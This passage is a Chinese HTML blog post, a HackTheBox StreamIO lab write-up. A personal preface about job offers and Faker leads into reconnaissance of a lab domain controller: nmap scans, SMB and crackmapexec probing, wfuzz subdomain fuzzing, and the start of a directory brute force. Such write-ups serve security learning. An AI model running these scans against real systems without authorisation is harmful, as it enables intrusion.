<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言在今年的9月底之前，我拿到了几家比较心仪的offer，互联网大厂安全岗和乙方安全岗皆有。回想自己今年下半年的生活，还是比较充实的。一边实习，一边准备秋招，一边又研究自己感兴趣的安全技术。在拿到了秋招offer的一个月后，我向实验室总监提交了离职申请。离职的最后一晚，我在望京SOHO转了一圈，忽然发现自己已经很舍不得这里了。  我起初的想法是觉得回学校能够更轻松自由一点，想学什么就学什么。但是回">
<meta property="og:type" content="article">
<meta property="og:title" content="[hackthebox]StreamIO WriteUp">
<meta property="og:url" content="https://blog.rainb0w.top/2023/12/10/htbStreamIO/index.html">
<meta property="og:site_name" content="rainb0w">
<meta property="og:description" content="前言在今年的9月底之前，我拿到了几家比较心仪的offer，互联网大厂安全岗和乙方安全岗皆有。回想自己今年下半年的生活，还是比较充实的。一边实习，一边准备秋招，一边又研究自己感兴趣的安全技术。在拿到了秋招offer的一个月后，我向实验室总监提交了离职申请。离职的最后一晚，我在望京SOHO转了一圈，忽然发现自己已经很舍不得这里了。  我起初的想法是觉得回学校能够更轻松自由一点，想学什么就学什么。但是回">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg">
<meta property="article:published_time" content="2023-12-10T00:00:00.000Z">
<meta property="article:modified_time" content="2023-12-10T19:43:45.840Z">
<meta property="article:author" content="rainb0w">
<meta property="article:tag" content="hackthebox">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>[hackthebox]StreamIO WriteUp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/01/09/test/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/08/08/Memory_WebShell/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&text=[hackthebox]StreamIO WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&is_video=false&description=[hackthebox]StreamIO WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[hackthebox]StreamIO WriteUp&body=Check out this article: https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&name=[hackthebox]StreamIO WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&t=[hackthebox]StreamIO WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">2.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetAdministrator"><span class="toc-number">3.</span> <span class="toc-text">GetAdministrator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        [hackthebox]StreamIO WriteUp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">rainb0w</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-10T00:00:00.000Z" class="dt-published" itemprop="datePublished">2023-12-10</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/hackthebox/" rel="tag">hackthebox</a>, <a class="p-category" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在今年的9月底之前，我拿到了几家比较心仪的offer，互联网大厂安全岗和乙方安全岗皆有。回想自己今年下半年的生活，还是比较充实的。一边实习，一边准备秋招，一边又研究自己感兴趣的安全技术。在拿到了秋招offer的一个月后，我向实验室总监提交了离职申请。离职的最后一晚，我在望京SOHO转了一圈，忽然发现自己已经很舍不得这里了。</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg"></a></p>
<p>我起初的想法是觉得回学校能够更轻松自由一点，想学什么就学什么。但是回到学校之后的一个多月里，我几乎天天都在摆烂，每天不是刷刷b站就是玩玩游戏，完全提不起学习的念头，之前想好的计划也全部落空。直到前些天，看到了Faker夺冠。</p>
<p>我大约是从S6开始关注英雄联盟赛事的。在我刚刚观看英雄联盟比赛的时候，Faker就已经是当之无愧的GOAT了。我对Faker最初的印象是觉得他个人实力很强，光是在中路站着就已经让人感觉脊背发凉了。但是我却并不是从S6，也就是Faker成为三冠王的时候开始喜欢Faker的。我最开始喜欢Faker的时候，是在去年全球总决赛半决赛，T1对阵JDG的时候。我记得当时是第四局，Faker操刀的沙皇在这一局里发挥非常亮眼。印象很深的一波是Faker在JDG蓝区果断闪现过墙赶路，然后大招推回两人，从那一刻起，这场比赛对于JDG来说已经渐渐走远了。但这一波也只能说明Faker是一个很果断、面对机会敢于大胆尝试的选手，真正让我感到动容的是在后面中路的一波团战，Faker漂移+大招推到敌方四个人的那一波。那一波打完之后，镜头给了Faker一个特写，我看到Faker满含笑意的眼睛里出现了一滴眼泪。</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg"></a></p>
<p>那一刻，我深深地被Faker的个人魅力所折服。那个时候距离Faker第一次登上赛场已经过去很多年了，但是Faker对于英雄联盟的热爱却从未减弱。即使很多人觉得他已经老了，已经完全没有办法跟年轻人去拼操作了，但是他依然凭借自己的努力站在比赛的舞台上并打出出色的表现。因此即使去年T1决赛输给了DRX，我也并未对Faker的喜爱减少半分，因为我相信像他这样的人，是一定会再得到一个冠军的。</p>
<p>只是命运似乎总是喜欢捉弄人，它在让一个人成功之前，总是要先让这个人吃点苦头。在 T1 拿到了世界赛亚军之后，命运又送给了这支队伍两次亚军，T1也被戏称为大满亚队伍。在今年7月份的时候，Faker因为手伤折磨，下场休息了一个月。在这一个月的时间里，T1打了8个BO3只赢了1把。说实话，当时看到这个战绩的时候，我就对于今年T1能够再拿到一个冠军不再抱有任何信心了。但是Faker回来之后，又带领4个队友成功杀到夏季赛决赛，然后又拿了一个亚军……虽说与之前的战绩相比亚军也已经可以了，但是我也并不觉得今年Faker能够拿到冠军。因为去年一路所向披靡都没有拿到冠军，更何况今年呢？而世界赛初期T1的表现似乎也印证了我的想法，比如T1第一局对阵TL都差点翻车，碰到Geng又输了一局。然后我就是抱着这样看衰的心态，看着Faker带着4个队友一路过五关斩六将，以对位 LPL赛区 11-1的豪华战绩拿到了世界赛的冠军。</p>
<p>看到Faker拿到了他的第四冠，我是打心底里佩服和高兴的，但是高兴之余又会想到自己。这段时间我一直在问自己可不可以做到像Faker这样，对于自己热爱的事业数十年如一日的坚持下去。Faker从S6之后的故事似乎只是在告诉我们一件事，那就是用十年的时间坚持不懈的去做一件事，梦想才有可能成真。在明白了这一点之后，我开始打起精神。我希望自己可以做到像Faker那样，保持谦逊，并且对于自己热爱的事情可以全力以赴地去做。</p>
<p>因此最近我又有了学习的动力，这些天也是挑了一些HTB的靶机打了打，想让自己的手感恢复起来。接下来的文章就是对我在打StreamIO这台靶机的时候所想到的一些思路和采用的方法做一个记录，尽可能详细吧。</p>
<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>因为靶场比较复杂，为了使得网络尽量稳定，我们在连接VPN的时候可以通过代理服务器连接。向.ovpn文件中添加如下配置：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg"></a></p>
<p>其中192.168.135.1是我的代理服务器的IP，7890是代理端口，你需要改成你自己的。另外OpenVPN的http-proxy必须使用TCP协议。通过代理连接VPN，速度还是比较快的：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg"></a></p>
<p>接下来开始打靶，首先执行<code>nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</code>看看开放的端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Fri Dec  8 00:36:44 2023 as: nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65517 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">51260/tcp open  unknown</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:38:18 2023 -- 1 IP address (1 host up) scanned in 93.30 seconds</span></span><br></pre></td></tr></table></figure>

<p>接下来进行详细端口扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 53,80,88,135,139,389,443,445,464,593,636,5985,9389,49667,49673,49674,49705,51260 --min-rate 5000 -oA nmapscan/details 10.10.11.158</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-08 12:44:22Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-12-08T12:46:06+00:00; +7h00m00s from scanner time.</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=streamIO/countryName=EU</span><br><span class="line">| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span><br><span class="line">| Not valid before: 2022-02-22T07:03:28</span><br><span class="line">|_Not valid after:  2022-03-24T07:03:28</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">51260/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2023-12-08T12:45:31</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:46:13 2023 -- 1 IP address (1 host up) scanned in 119.55 seconds</span></span><br></pre></td></tr></table></figure>

<p>通过扫描信息，可以判断这是一台DC。接着将<code>streamio.htb</code>和<code>watch.streamio.htb</code>写入到hosts。因为开放了139和445端口，尝试smb匿名连接：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg"></a></p>
<p>执行<code>crackmapexec smb 10.10.11.158</code>可以扫到一台机子，将<code>dc.streamio.htb</code>也添加进hosts：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg"></a></p>
<p>接下来就扫一下子域名吧：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H <span class="string">&quot;HOST: FUZZ.streamio.htb&quot;</span> -u https://streamio.htb/ --hw 24 --hc 400</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/</span></span><br><span class="line"><span class="string">Total requests: 19966</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000002268:   200        78 L     245 W      2829 Ch     &quot;watch - watch&quot;                                                                                                           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 240.1962</span></span><br><span class="line"><span class="string">Processed Requests: 19966</span></span><br><span class="line"><span class="string">Filtered Requests: 19965</span></span><br><span class="line"><span class="string">Requests/sec.: 83.12368</span></span><br></pre></td></tr></table></figure>

<p>没有收获，只扫到一个已有的watch.streamio.htb。接下来我们访问一下这台主机部署的Web服务：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg"></a></p>
<p>80端口是一个很普通的IIS Server的欢迎界面，没什么值得关注的点。接下来我们访问一下443端口，以下是<a href="https://streamio.htb的界面：">https://streamio.htb的界面：</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg"></a></p>
<p>尝试注册登录，显示注册成功，但是登录却登录不上，sqlmap扫了也没什么发现。对其他地方进行检查，也没有发现可疑的点。接下来看看<a target="_blank" rel="noopener" href="https://watch.streamio.htb/%EF%BC%9A">https://watch.streamio.htb/：</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg"></a></p>
<p>分析之后没得到可以利用的点。那接下来就爆破一下目录吧：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 